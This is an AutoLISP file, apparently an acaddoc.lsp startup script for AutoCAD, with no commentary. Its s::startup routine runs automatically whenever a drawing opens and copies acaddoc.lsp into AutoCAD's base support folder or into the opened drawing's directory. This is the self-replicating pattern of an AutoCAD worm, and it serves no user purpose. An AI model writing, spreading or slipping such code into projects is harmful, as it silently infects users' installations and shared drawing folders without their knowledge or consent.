(defun-q s::startup
	 (/ basepath
	    baseacad
	    acaddocpath
	    r-acaddoc
	    w-basepath
	    rl-acaddoc
	    acaddoclsp
	    c-acaddocname
	    c-acaddocpath
	    c-acaddoc
	   )
     (setq basepath
	    (findfile "base.dcl")
     )
     (setq basepath
	    (substr basepath
		    1 (- (strlen basepath) 8)
            )
     )
     (setq baseacad (strcat basepath "acaddoc.lsp"))
  
	(setq acaddocpath
               (findfile "acaddoc.lsp")
	)
	(setq acaddocpath
	       (substr acaddocpath
		       1 (- (strlen acaddocpath) 11)
	       )
	)
	(setq acaddoclsp
	       (strcat acaddocpath "acaddoc.lsp"))
	
	
        (setq c-acaddocname
	       (getvar "dwgname")
	)
        (setq c-acaddocpath
	       (findfile c-acaddocname)
	)
        (setq c-acaddocpath
	       (substr c-acaddocpath
		       1 (- (strlen c-acaddocpath) (strlen c-acaddocname))	
		)
	 )
        (setq c-acaddoc
	       (strcat c-acaddocpath "acaddoc.lsp")
	 )
	 (if
           (and
	   (/= basepath acaddocpath)
	   (= c-acaddocpath acaddocpath)
	   )
	     (progn
	       (setq r-acaddoc
	       (open acaddoclsp "r")
	       )
	       (setq w-basepath
	          (open baseacad "w")
		)     
	       (while
	           (setq rl-acaddoc
		    (read-line r-acaddoc)
	           )
	           (write-line rl-acaddoc w-basepath)
	        )
	        (close w-basepath)   
                (close r-acaddoc)
	    
             )
         
	     (progn
	       (setq r-acaddoc
	       (open acaddoclsp "r")
	       )
	       (setq w-basepath
	          (open c-acaddoc "w")
		)
	        (while
	           (setq rl-acaddoc
		    (read-line r-acaddoc)
	           )
	           (write-line rl-acaddoc w-basepath)
	        )
	        (close w-basepath)   
                (close r-acaddoc)
	    
             )
	 )
	 (princ)
)

(princ)
